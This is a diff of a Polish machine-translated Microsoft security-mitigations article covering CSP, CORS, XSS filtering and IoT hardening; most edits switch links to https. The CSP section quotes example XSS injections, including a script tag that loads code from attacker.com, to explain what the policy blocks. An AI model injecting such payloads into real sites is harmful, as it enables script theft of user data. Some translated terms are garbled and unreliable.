@@ -14,12 +14,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: b24d32afed5acfd846f9a8e8316339665524ad2e
-ms.sourcegitcommit: 11d8ce8cd720a1ec6ca130e118489c6459e04114
+ms.openlocfilehash: bd1d3c71660ae584b0aa57c7cc765fdc519f4b1b
+ms.sourcegitcommit: 5839af386c5a2ad46aaaeb90a13065ef94e61e74
 ms.translationtype: MT
 ms.contentlocale: pl-PL
-ms.lasthandoff: 12/04/2018
-ms.locfileid: "52849772"
+ms.lasthandoff: 03/19/2019
+ms.locfileid: "57863597"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Ramka zabezpieczeń: Zarządzanie konfiguracją | Środki zaradcze 
 | Produkt/usługę | Artykuł |
@@ -28,22 +28,22 @@ ms.locfileid: "52849772"
 | **Baza danych** | <ul><li>[Konfigurowanie zapory Windows dla dostępu aparatu bazy danych](#firewall-db)</li></ul> |
 | **Interfejs API sieci Web** | <ul><li>[Upewnij się, że dozwolone są tylko z zaufanego źródła, włączenie mechanizmu CORS interfejsu API sieci Web platformy ASP.NET](#cors-api)</li><li>[Szyfruj sekcje internetowego interfejsu API plików konfiguracyjnych, które zawierają dane poufne](#config-sensitive)</li></ul> |
 | **Urządzenia IoT** | <ul><li>[Upewnij się, że wszystkie interfejsów administracyjnych są zabezpieczone przy użyciu silnych poświadczeń](#admin-strong)</li><li>[Upewnij się, że nieznany kod nie można wykonać na urządzeniach](#unknown-exe)</li><li>[Szyfrowanie systemu operacyjnego i dodatkowe partycje urządzeń IoT za pomocą skrytki bitowe](#partition-iot)</li><li>[Upewnij się, że tylko minimalne usług/funkcji są włączone na urządzeniach](#min-enable)</li></ul> |
-| **Bramy w terenie IoT** | <ul><li>[Szyfrowanie systemu operacyjnego i dodatkowe partycje bramy w terenie IoT przy użyciu bitowego skrytki](#field-bit-locker)</li><li>[Upewnij się, że poświadczenia logowania domyślnej bramy pola zostały zmienione podczas instalacji](#default-change)</li></ul> |
-| **Brama chmury IoT** | <ul><li>[Upewnij się, że bramy w chmurze implementuje proces aktualizowania oprogramowania układowego połączonych urządzeń](#cloud-firmware)</li></ul> |
+| **IoT Field Gateway** | <ul><li>[Szyfrowanie systemu operacyjnego i dodatkowe partycje bramy w terenie IoT przy użyciu bitowego skrytki](#field-bit-locker)</li><li>[Upewnij się, że poświadczenia logowania domyślnej bramy pola zostały zmienione podczas instalacji](#default-change)</li></ul> |
+| **IoT Cloud Gateway** | <ul><li>[Upewnij się, że bramy w chmurze implementuje proces aktualizowania oprogramowania układowego połączonych urządzeń](#cloud-firmware)</li></ul> |
 | **Maszyny granicy zaufania** | <ul><li>[Upewnij się, że urządzenia mają skonfigurowane zgodnie z zasadami organizacji kontroli zabezpieczeń punktu końcowego](#controls-policies)</li></ul> |
 | **Azure Storage** | <ul><li>[Upewnij się, bezpieczne zarządzanie kluczami dostępu do magazynu platformy Azure](#secure-keys)</li><li>[Upewnij się, że dozwolone są tylko z zaufanego źródła, włączenie mechanizmu CORS w usłudze Azure storage](#cors-storage)</li></ul> |
 | **WCF** | <ul><li>[Włączanie usługi WCF w funkcji ograniczania](#throttling)</li><li>[Ujawnienie informacji programu WCF za pomocą metadanych](#info-metadata)</li></ul> | 
 
 ## <a id="csp-js"></a>Implementowanie zasad zabezpieczeń zawartości (CSP), a następnie wyłącz javascript wbudowane
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Aplikacja sieci Web | 
 | **Faza SDL**               | Kompilacja |  
 | **Odpowiednich technologii** | Ogólny |
 | **Atrybuty**              | ND  |
-| **Odwołania**              | [Wprowadzenie do zasad zabezpieczeń zawartości](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [informacje o zasadach zabezpieczeń zawartości](http://content-security-policy.com/), [funkcje zabezpieczeń](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [wprowadzenie do zasad zabezpieczeń zawartości](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [Można użyć dostawcy usług Kryptograficznych?](http://caniuse.com/#feat=contentsecuritypolicy) |
-| **Kroki** | <p>Zasad zabezpieczeń zawartości (CSP) jest ochronę w głębi mechanizm zabezpieczeń, W3C standard, umożliwiająca właścicieli aplikacji sieci web mieć kontrolę nad osadzonej w lokacji zawartości. Dostawca usług Kryptograficznych jest dodawany jako nagłówka odpowiedzi HTTP, na serwerze sieci web i jest wymuszane po stronie klienta przez przeglądarki. To zasady oparte na liście dozwolonych elementów — witryny sieci Web można zadeklarować zestaw zaufanych domen, z którym zawartość jest aktywne, takich jak JavaScript, które mogą zostać załadowane.</p><p>Dostawca usług chmury zapewnia następujące korzyści zabezpieczeń:</p><ul><li>**Ochrona przed XSS:** Jeśli strona jest narażony na XSS, osoba atakująca może wykorzystać je na 2 sposoby:<ul><li>Wstrzykiwanie `<script>malicious code</script>`. Ten program wykorzystujący luki nie będzie działać z powodu dostawcy rozwiązań w Chmurze podstawowej ograniczeń-1</li><li>Wstrzykiwanie `<script src=”http://attacker.com/maliciousCode.js”/>`. Ten program wykorzystujący luki nie będzie działać, ponieważ nie będzie domenie osoba atakująca kontrolowane w dostawcy rozwiązań w Chmurze dozwolonych domen</li></ul></li><li>**Kontrolę nad wykradanie danych:** jeśli wszelkie złośliwej zawartości sieci Web próbuje nawiązać połączenie z zewnętrznej witryny sieci Web i kradzieży danych, połączenie zostanie przerwane przy pomocy dostawcy CSP. Jest to spowodowane domeny docelowej nie będzie lista dozwolonych adresów dostawcy rozwiązań w Chmurze</li><li>**Obrony przed miejsca kliknij:** miejsca kliknij to technika ataku przy użyciu której osoba atakująca może klatki, oryginalnym użytkowników witryny sieci Web i Wymuś kliknij elementy interfejsu użytkownika. Obecnie obrony przed miejsca kliknij osiągnięte przez skonfigurowanie odpowiedzi nagłówek X-Frame-Options. Nie wszystkie przeglądarki przestrzegać tego pliku nagłówkowego przechodzenia do przodu dostawcy usług Kryptograficznych. zostanie ona standardowy sposób obrony przed miejsca kliknięcia</li><li>**Raportowanie w czasie rzeczywistym ataku:** w przypadku ataku polegającego na iniekcji w witrynie sieci Web z obsługą dostawcy usług Kryptograficznych, przeglądarek automatycznie wyzwoli powiadomienie, aby punkty końcowe skonfigurowane na serwerze sieci Web. Dzięki temu dostawcy usług Kryptograficznych służy jako system ostrzeżenie w czasie rzeczywistym.</li></ul> |
+| **Odwołania**              | [Wprowadzenie do zasad zabezpieczeń zawartości](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [informacje o zasadach zabezpieczeń zawartości](https://content-security-policy.com/), [funkcje zabezpieczeń](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [wprowadzenie do zasad zabezpieczeń zawartości](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [Można użyć dostawcy usług Kryptograficznych?](https://caniuse.com/#feat=contentsecuritypolicy) |
+| **Kroki** | <p>Zasad zabezpieczeń zawartości (CSP) jest ochronę w głębi mechanizm zabezpieczeń, W3C standard, umożliwiająca właścicieli aplikacji sieci web mieć kontrolę nad osadzonej w lokacji zawartości. Dostawca usług Kryptograficznych jest dodawany jako nagłówka odpowiedzi HTTP, na serwerze sieci web i jest wymuszane po stronie klienta przez przeglądarki. To zasady oparte na liście dozwolonych elementów — witryny sieci Web można zadeklarować zestaw zaufanych domen, z którym zawartość jest aktywne, takich jak JavaScript, które mogą zostać załadowane.</p><p>Dostawca usług chmury zapewnia następujące korzyści zabezpieczeń:</p><ul><li>**Ochrona przed XSS:** Jeśli strona jest narażony na XSS, osoba atakująca może wykorzystać je na 2 sposoby:<ul><li>Wstrzykiwanie `<script>malicious code</script>`. Ten program wykorzystujący luki nie będzie działać z powodu dostawcy rozwiązań w Chmurze podstawowej ograniczeń-1</li><li>Wstrzykiwanie `<script src=”http://attacker.com/maliciousCode.js”/>`. Ten program wykorzystujący luki nie będzie działać, ponieważ nie będzie domenie osoba atakująca kontrolowane w dostawcy rozwiązań w Chmurze dozwolonych domen</li></ul></li><li>**Kontrolę nad wykradanie danych:** Jeśli wszystkie złośliwej zawartości sieci Web próbuje nawiązać połączenie z zewnętrznej witryny sieci Web i kradzieży danych, połączenie zostanie przerwane przy pomocy dostawcy CSP. Jest to spowodowane domeny docelowej nie będzie lista dozwolonych adresów dostawcy rozwiązań w Chmurze</li><li>**Obrony przed miejsca kliknij:** miejsca kliknij to technika ataku przy użyciu której osoba atakująca może klatki, oryginalnym użytkowników witryny sieci Web i Wymuś kliknij elementy interfejsu użytkownika. Obecnie obrony przed miejsca kliknij osiągnięte przez skonfigurowanie odpowiedzi nagłówek X-Frame-Options. Nie wszystkie przeglądarki przestrzegać tego pliku nagłówkowego przechodzenia do przodu dostawcy usług Kryptograficznych. zostanie ona standardowy sposób obrony przed miejsca kliknięcia</li><li>**Raportowanie w czasie rzeczywistym ataku:** W przypadku ataku polegającego na iniekcji w witrynie sieci Web z obsługą dostawcy usług Kryptograficznych, przeglądarek automatycznie wyzwoli powiadomienie, aby punkty końcowe skonfigurowane na serwerze sieci Web. Dzięki temu dostawcy usług Kryptograficznych służy jako system ostrzeżenie w czasie rzeczywistym.</li></ul> |
 
 ### <a name="example"></a>Przykład
 Przykład zasad: 
@@ -68,7 +68,7 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a id="xss-filter"></a>Włącz filtr XSS przeglądarki
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Aplikacja sieci Web | 
 | **Faza SDL**               | Kompilacja |  
@@ -79,18 +79,18 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a id="trace-deploy"></a>Aplikacje ASP.NET, należy wyłączyć śledzenie i debugowanie przed wdrożeniem
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Aplikacja sieci Web | 
 | **Faza SDL**               | Kompilacja |  
 | **Odpowiednich technologii** | Ogólny |
 | **Atrybuty**              | ND  |
-| **Odwołania**              | [Informacje o debugowaniu ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET śledzenie — Przegląd](http://msdn2.microsoft.com/library/bb386420.aspx), [jak: włączyć śledzenie aplikacji ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [porady: Włączanie debugowania dla aplikacji ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
+| **Odwołania**              | [Informacje o debugowaniu ASP.NET](https://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET śledzenie — Przegląd](https://msdn2.microsoft.com/library/bb386420.aspx), [jak: Włącz śledzenie dla aplikacji ASP.NET](https://msdn2.microsoft.com/library/0x5wc973.aspx), [jak: Włącz debugowanie aplikacji ASP.NET](https://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
 | **Kroki** | Gdy włączone jest śledzenie dla strony przeglądarki, każdy proces żądania uzyskuje informacje o śledzeniu, który zawiera dane dotyczące stanu wewnętrznego serwera i przepływ pracy. Te informacje można zabezpieczenia poufnych. Debugowanie jest włączone dla strony, błędów, wykonywane na serwerze spowodować pełny stos danych śledzenia, przedstawione w przeglądarce. Te dane mogą ujawniać informacje związane z zabezpieczeniami dotyczące serwera przepływu pracy. |
 
 ## <a id="js-trusted"></a>Skrypty JavaScript innych firm na dostęp tylko z zaufanych źródeł
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Aplikacja sieci Web | 
 | **Faza SDL**               | Kompilacja |  
@@ -101,7 +101,7 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a id="ui-defenses"></a>Upewnij się, że uwierzytelnionego strony ASP.NET zestawowi Redressing interfejsu użytkownika lub miejsca kliknij mechanizmów obronnych
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Aplikacja sieci Web | 
 | **Faza SDL**               | Kompilacja |  
@@ -136,7 +136,7 @@ Kod pliku Web.config dla witryny, które powinny być tylko obramowane przez str
 
 ## <a id="cors-aspnet"></a>Upewnij się, że dozwolone są tylko z zaufanego źródła, włączenie mechanizmu CORS w aplikacji sieci Web ASP.NET
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Aplikacja sieci Web | 
 | **Faza SDL**               | Kompilacja |  
@@ -152,7 +152,7 @@ Jeśli dostęp do pliku Web.config jest dostępny, mechanizm CORS, mogą być do
     <httpProtocol>
       <customHeaders>
         <clear />
-        <add name="Access-Control-Allow-Origin" value="http://example.com" />
+        <add name="Access-Control-Allow-Origin" value="https://example.com" />
       </customHeaders>
     </httpProtocol>
 ```
@@ -160,20 +160,20 @@ Jeśli dostęp do pliku Web.config jest dostępny, mechanizm CORS, mogą być do
 ### <a name="example"></a>Przykład
 Jeśli nie ma dostępu do pliku web.config, mechanizm CORS można skonfigurować, dodając następujący kod w języku CSharp: 
 ```csharp
-HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
+HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
 ```
 
 Należy pamiętać, że jest krytyczne, aby upewnić się, że lista źródeł w atrybucie "Access-Control-Allow-Origin" jest ustawiona na zestaw ograniczone i zaufanych źródeł. Nie można skonfigurować niewłaściwie (np. ustawienie wartości jako "*") umożliwi złośliwych witryn wyzwolić żądania między źródłami do aplikacji sieci web > bez żadnych ograniczeń, sprawiając, że aplikacja narażone na ataki CSRF. 
 
 ## <a id="validate-aspnet"></a>Włącz atrybut parametr ValidateRequest na stronach ASP.NET
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Aplikacja sieci Web | 
 | **Faza SDL**               | Kompilacja |  
 | **Odpowiednich technologii** | Web Forms, MVC5 |
 | **Atrybuty**              | ND  |
-| **Odwołania**              | [Żądanie weryfikacji — zapobieganie atakom skryptów](http://www.asp.net/whitepapers/request-validation) |
+| **Odwołania**              | [Żądanie weryfikacji — zapobieganie atakom skryptów](https://www.asp.net/whitepapers/request-validation) |
 | **Kroki** | <p>Weryfikacja żądania, funkcji programu ASP.NET od wersji 1.1, uniemożliwia serwera przyjmowanie zawartości zawierającego usunięcie zakodowanym formacie HTML. Ta funkcja została zaprojektowana, aby zapobiec atakom niektóre uruchomienie skryptu, zgodnie z którą kod skryptu klienta lub HTML może być nieświadomie przesłane do serwera, przechowywanych i przedstawiony w innym użytkownikom. Firma Microsoft nadal zdecydowanie zaleca zweryfikowanie wszystkich danych wejściowych i kodowanie HTML, gdy jest to odpowiednie.</p><p>Weryfikacja żądania jest wykonywane przez porównanie wszystkich danych wejściowych na listę potencjalnie niebezpiecznych wartości. W przypadku dopasowania ASP.NET zgłasza `HttpRequestValidationException`. Domyślnie funkcja Weryfikacja żądania jest włączona.</p>|
 
 ### <a name="example"></a>Przykład
@@ -193,7 +193,7 @@ lub na poziomie aplikacji
 
 ## <a id="local-js"></a>Użyj lokalnie hostowanych najnowsze wersje bibliotek JavaScript
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Aplikacja sieci Web | 
 | **Faza SDL**               | Kompilacja |  
@@ -204,13 +204,13 @@ lub na poziomie aplikacji
 
 ## <a id="mime-sniff"></a>Wyłącz automatyczne wykrywanie MIME
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Aplikacja sieci Web | 
 | **Faza SDL**               | Kompilacja |  
 | **Odpowiednich technologii** | Ogólny |
 | **Atrybuty**              | ND  |
-| **Odwołania**              | [Część zabezpieczeń IE8 V: kompleksową ochronę](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [typ MIME](http://en.wikipedia.org/wiki/Mime_type) |
+| **Odwołania**              | [IE8 Część zabezpieczeń V: Kompleksowa ochrona](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [typ MIME](https://en.wikipedia.org/wiki/Mime_type) |
 | **Kroki** | Nagłówek X-zawartości-typ-Options jest nagłówek HTTP, która umożliwia deweloperom określić, że jego zawartość nie powinny być ten MIME. Ten nagłówek zaprojektowano w celu zmniejszenia wykrywanie MIME ataków. Dla każdej strony mogą zawierać treści, którymi można sterować użytkownika, należy użyć X nagłówka HTTP-zawartości — typ — opcje: nosniff. Aby włączyć wymagany nagłówek globalnie dla wszystkich stron w aplikacji, możesz wykonać jedną z następujących czynności|
 
 ### <a name="example"></a>Przykład
@@ -269,7 +269,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 ## <a id="standard-finger"></a>Usuwanie nagłówków standardowy serwer witryny sieci Web na Windows Azure w celu uniknięcia odcisków
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Aplikacja sieci Web | 
 | **Faza SDL**               | Kompilacja |  
@@ -280,24 +280,24 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 ## <a id="firewall-db"></a>Konfigurowanie zapory Windows dla dostępu aparatu bazy danych
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Database (Baza danych) | 
 | **Faza SDL**               | Kompilacja |  
-| **Odpowiednich technologii** | Azure SQL, lokalnego |
+| **Odpowiednich technologii** | SQL Azure, OnPrem |
 | **Atrybuty**              | N/d, wersja SQL - V12 |
 | **Odwołania**              | [Jak skonfigurować zaporę bazy danych Azure SQL](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [skonfigurować zaporę Windows dla dostępu aparatu bazy danych](https://msdn.microsoft.com/library/ms175043) |
 | **Kroki** | Systemy zapory pomagają zapobiegać nieautoryzowanemu dostępowi do zasobów komputera. Dostęp do wystąpienia aparatu bazy danych programu SQL Server za pośrednictwem zapory, należy skonfigurować zaporę na komputerze z uruchomionym serwerem SQL, aby zezwolić na dostęp |
 
 ## <a id="cors-api"></a>Upewnij się, że dozwolone są tylko z zaufanego źródła, włączenie mechanizmu CORS interfejsu API sieci Web platformy ASP.NET
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Interfejs API sieci Web | 
 | **Faza SDL**               | Kompilacja |  
 | **Odpowiednich technologii** | MVC 5 |
 | **Atrybuty**              | ND  |
-| **Odwołania**              | [Włączanie żądań Cross-Origin we wzorcu ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [wzorca ASP.NET Web API — Obsługa mechanizmu CORS we wzorcu ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
+| **Odwołania**              | [Włączanie żądań Cross-Origin we wzorcu ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [wzorca ASP.NET Web API — Obsługa mechanizmu CORS we wzorcu ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
 | **Kroki** | <p>Zabezpieczenia przeglądarki uniemożliwiają stronie internetowej wysyłanie żądań AJAX do innej domeny. To ograniczenie jest nazywany zasadami tego samego źródła i uniemożliwia złośliwym odczytywanie poufnych danych z innej lokacji. Jednak czasami może być wymagane do udostępnienia interfejsów API bezpiecznie inne witryny, dla których można korzystać. Krzyżowe CORS Origin Resource Sharing () jest to standard W3C, dzięki któremu serwer może Poluzować zasady tego samego źródła.</p><p>Przy użyciu mechanizmu CORS, serwer można jawnie zezwolić na niektórych żądań cross-origin jednocześnie odrzucając inne. CORS to bezpieczniejsze i bardziej elastyczne niż wcześniej technik, takich jak JSONP.</p>|
 
 ### <a name="example"></a>Przykład
@@ -367,7 +367,7 @@ Należy pamiętać, że koniecznie upewnij się, że lista źródeł w atrybucie
 ### <a name="example"></a>Przykład
 Aby wyłączyć CORS dla określonej metody w klasie, atrybut DisableCors może być używany, jak pokazano poniżej: 
 ```csharp
-[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
+[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
 public class ResourcesController : ApiController
 {
   public HttpResponseMessage Put(Resource data)
@@ -387,7 +387,7 @@ public class ResourcesController : ApiController
 }
 ```
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Interfejs API sieci Web | 
 | **Faza SDL**               | Kompilacja |  
@@ -396,7 +396,7 @@ public class ResourcesController : ApiController
 | **Odwołania**              | [Włączanie żądań Cross-Origin (CORS) w programie ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
 | **Kroki** | <p>W programie ASP.NET Core 1.0 CORS można włączyć za pomocą oprogramowania pośredniczącego lub za pomocą MVC. Włączanie mechanizmu CORS za pomocą MVC tych samych usług mechanizmu CORS są używane, ale nie jest oprogramowanie pośredniczące CORS.</p>|
 
-**Podejście 1** włączenie mechanizmu CORS za pomocą oprogramowania pośredniczącego: Aby włączyć mechanizm CORS dla całej aplikacji Dodaj oprogramowanie pośredniczące CORS do Potok żądań przy użyciu metody rozszerzenia UseCors. Podczas dodawania oprogramowanie pośredniczące CORS za pomocą klasy CorsPolicyBuilder można określić zasady cross-origin. Istnieją dwa sposoby, w tym celu:
+**Podejście 1** włączenie mechanizmu CORS za pomocą oprogramowania pośredniczącego: Aby włączyć mechanizm CORS dla całej aplikacji, należy dodać oprogramowanie pośredniczące CORS do Potok żądań przy użyciu metody rozszerzenia UseCors. Podczas dodawania oprogramowanie pośredniczące CORS za pomocą klasy CorsPolicyBuilder można określić zasady cross-origin. Istnieją dwa sposoby, w tym celu:
 
 ### <a name="example"></a>Przykład
 Pierwsza to wywołanie UseCors z wyrażenia lambda. Wyrażenie lambda przyjmuje obiekt CorsPolicyBuilder: 
@@ -404,7 +404,7 @@ Pierwsza to wywołanie UseCors z wyrażenia lambda. Wyrażenie lambda przyjmuje 
 public void Configure(IApplicationBuilder app)
 {
     app.UseCors(builder =>
-        builder.WithOrigins("http://example.com")
+        builder.WithOrigins("https://example.com")
         .WithMethods("GET", "POST", "HEAD")
         .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
 }
@@ -418,7 +418,7 @@ public void ConfigureServices(IServiceCollection services)
     services.AddCors(options =>
     {
         options.AddPolicy("AllowSpecificOrigin",
-            builder => builder.WithOrigins("http://example.com"));
+            builder => builder.WithOrigins("https://example.com"));
     });
 }
 public void Configure(IApplicationBuilder app)
@@ -431,10 +431,10 @@ public void Configure(IApplicationBuilder app)
 }
 ```
 
-**Podejście 2** włączenie mechanizmu CORS w MVC: deweloperzy mogą również używać MVC do zastosowania określonego CORS każdej akcji, każdy kontroler lub globalnie dla wszystkich kontrolerów.
+**Podejście 2** włączenie mechanizmu CORS w MVC: Deweloperzy mogą również używać MVC do zastosowania określonego CORS każdej akcji, każdy kontroler lub globalnie dla wszystkich kontrolerów.
 
 ### <a name="example"></a>Przykład
-Za akcję: Aby określić CORS zasad dla określonych akcji Dodaj atrybut [EnableCors] do akcji. Podaj nazwę zasad. 
+Każdej akcji: Aby określić mechanizm CORS zasad dla określonej akcji, należy dodać atrybut [EnableCors] do akcji. Podaj nazwę zasad. 
 ```csharp
 public class HomeController : Controller
 {
@@ -479,7 +479,7 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="config-sensitive"></a>Szyfruj sekcje internetowego interfejsu API plików konfiguracyjnych, które zawierają dane poufne
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Interfejs API sieci Web | 
 | **Faza SDL**               | Wdrożenie |  
@@ -490,7 +490,7 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="admin-strong"></a>Upewnij się, że wszystkie interfejsów administracyjnych są zabezpieczone przy użyciu silnych poświadczeń
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Urządzenia IoT | 
 | **Faza SDL**               | Wdrożenie |  
@@ -501,7 +501,7 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="unknown-exe"></a>Upewnij się, że nieznany kod nie można wykonać na urządzeniach
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Urządzenia IoT | 
 | **Faza SDL**               | Kompilacja |  
@@ -512,7 +512,7 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="partition-iot"></a>Szyfrowanie systemu operacyjnego i dodatkowe partycje urządzeń IoT za pomocą skrytki bitowe
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Urządzenia IoT | 
 | **Faza SDL**               | Kompilacja |  
@@ -523,7 +523,7 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="min-enable"></a>Upewnij się, że tylko minimalne usług/funkcji są włączone na urządzeniach
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Urządzenia IoT | 
 | **Faza SDL**               | Wdrożenie |  
@@ -534,7 +534,7 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="field-bit-locker"></a>Szyfrowanie systemu operacyjnego i dodatkowe partycje bramy w terenie IoT przy użyciu bitowego skrytki
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Bramy w terenie IoT | 
 | **Faza SDL**               | Wdrożenie |  
@@ -545,7 +545,7 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="default-change"></a>Upewnij się, że poświadczenia logowania domyślnej bramy pola zostały zmienione podczas instalacji
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Bramy w terenie IoT | 
 | **Faza SDL**               | Wdrożenie |  
@@ -556,9 +556,9 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="cloud-firmware"></a>Upewnij się, że bramy w chmurze implementuje proces aktualizowania oprogramowania układowego połączonych urządzeń
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
-| **Składnik**               | Brama chmury IoT | 
+| **Składnik**               | IoT Cloud Gateway | 
 | **Faza SDL**               | Kompilacja |  
 | **Odpowiednich technologii** | Ogólny |
 | **Atrybuty**              | Wybór bramy — usługi Azure IoT Hub |
@@ -567,7 +567,7 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="controls-policies"></a>Upewnij się, że urządzenia mają skonfigurowane zgodnie z zasadami organizacji kontroli zabezpieczeń punktu końcowego
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Maszyny granicy zaufania | 
 | **Faza SDL**               | Wdrożenie |  
@@ -578,7 +578,7 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="secure-keys"></a>Upewnij się, bezpieczne zarządzanie kluczami dostępu do magazynu platformy Azure
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Azure Storage | 
 | **Faza SDL**               | Wdrożenie |  
@@ -589,7 +589,7 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="cors-storage"></a>Upewnij się, że dozwolone są tylko z zaufanego źródła, włączenie mechanizmu CORS w usłudze Azure storage
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | Azure Storage | 
 | **Faza SDL**               | Kompilacja |  
@@ -600,14 +600,14 @@ Aby wyłączyć CORS dla kontrolera lub akcji, użyj atrybutu [DisableCors].
 
 ## <a id="throttling"></a>Włączanie usługi WCF w funkcji ograniczania
 
-| Stanowisko                   | Szczegóły      |
+| Tytuł                   | Szczegóły      |
 | ----------------------- | ------------ |
 | **Składnik**               | WCF | 
 | **Faza SDL**               | Kompilacja |  
-| **Odpowiednich technologii** | .NET framework 3 |
+| **Odpowiednich technologii** | .NET Framework 3 |
 | **Atrybuty**              | ND  |
 | **Odwołania**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [wzmacnia Królestwa](https://vulncat.fortify.com) |
